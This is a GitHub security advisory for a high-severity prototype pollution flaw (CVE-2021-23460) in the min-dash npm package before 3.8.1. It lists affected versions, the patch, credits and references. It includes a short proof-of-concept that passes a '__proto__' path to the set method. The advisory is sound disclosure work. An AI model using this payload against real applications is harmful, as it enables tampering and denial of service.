# [H] Prototype pollution in min-dash

## Summary
Severity: High
Advisory: GHSA-2m53-83f3-562j
CVE: CVE-2021-23460
CWE: CWE-1321
Ecosystem: Maven, npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2022-02-01
Source: https://github.com/advisories/GHSA-2m53-83f3-562j
Type: github-advisory

## Affected
- npm: `min-dash` — affected >=0 <3.8.1
- Maven: `org.webjars.npm:min-dash` — affected >=0 <3.8.1

## Details
### Impact

The `set` method is vulnerable to prototype pollution with specially crafted inputs.

```javascript
// insert the following into poc.js and run node poc,js (after installing the package)
 
let parser = require("min-dash");
parser.set({}, [["__proto__"], "polluted"], "success");
console.log(polluted);
```

### Patches

`min-dash>=3.8.1` fix the issue.

### Workarounds

No workarounds exist for the issue.

### References

Closed via https://github.com/bpmn-io/min-dash/pull/21.

### Credits

Credits to Cristian-Alexandru STAICU who found the vulnerability and to Idan Digmi from the Snyk Security Team who reported the vulnerability to us, responsibly.

## References
- https://github.com/bpmn-io/min-dash/security/advisories/GHSA-2m53-83f3-562j
- https://nvd.nist.gov/vuln/detail/CVE-2021-23460
- https://github.com/bpmn-io/min-dash/pull/21
- https://github.com/bpmn-io/min-dash/commit/2c6689e2aa29f4b66a4874a2f3003431e9db48d1
- https://github.com/bpmn-io/min-dash
- https://github.com/bpmn-io/min-dash/blob/c4d579c0eb2ed0739592111c3906b198921d3f52/lib/object.js#L32
- https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-2342127
- https://snyk.io/vuln/SNYK-JS-MINDASH-2340605
